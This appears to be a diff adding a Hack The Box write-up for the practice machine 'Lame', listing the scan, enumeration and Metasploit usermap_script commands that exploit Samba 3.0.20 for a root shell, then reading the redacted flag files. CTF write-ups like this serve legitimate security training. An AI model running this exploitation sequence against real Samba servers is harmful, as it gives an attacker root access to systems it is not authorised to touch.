@@ -1,0 +1,51 @@
+# 💥 Hack The Box – Lame
+
+**IP:** 10.10.10.3  
+**OS:** Linux  
+**Difficulty:** Easy  
+**Status:** ✅ Rooted
+
+```bash
+# 🛠️ Connect to HTB VPN
+sudo openvpn --config [vpn-file.ovpn] --daemon
+ip a        # Check tun0 is up
+
+# 📁 Prepare workspace
+cd /tmp
+mkdir lame
+cd lame
+
+# 🔍 Full TCP port scan + service/version detection
+nmap -sS -sV -p- -T4 -Pn -oN fullscan.txt 10.10.10.3
+# → Port 445 open: Samba smbd 3.X - 4.X
+
+# 🧠 Find exact Samba version
+enum4linux -a 10.10.10.3 | tee enum.txt
+# → Detected: Samba 3.0.20-Debian
+
+# 💣 Launch exploit with Metasploit
+msfdb start
+msfconsole
+
+search samba 3.0.20
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.10.10.3
+set LHOST tun0
+run
+# → Got shell (root access)
+
+# 📦 Post-exploitation steps
+cd /home/makis
+ls
+cat user.txt   # [REDACTED]
+
+cd /root
+ls -la
+cat root.txt   # [REDACTED]
+ ```
+
+
+🧾 Notes
+🎯 Exploit provides direct root shell, no privilege escalation needed.
+✅ Commands tested and verified.
+🔐 Flags hidden for compliance with HTB Terms of Service.
